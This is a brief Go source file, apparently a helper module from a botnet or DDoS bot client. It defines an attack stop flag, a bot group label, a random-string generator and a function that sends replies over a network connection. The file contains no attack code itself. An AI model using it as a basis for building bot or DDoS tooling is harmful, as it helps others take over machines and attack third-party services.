package core

import (
	"math/rand"
	"net"
	"sync"
)

var (
	attackStopFlag = false
	attackMutex    sync.Mutex
	BotGroup       = "unknown"
)

func SetAttackStop(stop bool) {
	attackMutex.Lock()
	defer attackMutex.Unlock()
	attackStopFlag = stop
}

func GetAttackStop() bool {
	attackMutex.Lock()
	defer attackMutex.Unlock()
	return attackStopFlag
}

func RandStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func SendResponse(conn net.Conn, message string) {
	conn.Write([]byte(message + "\n"))
}
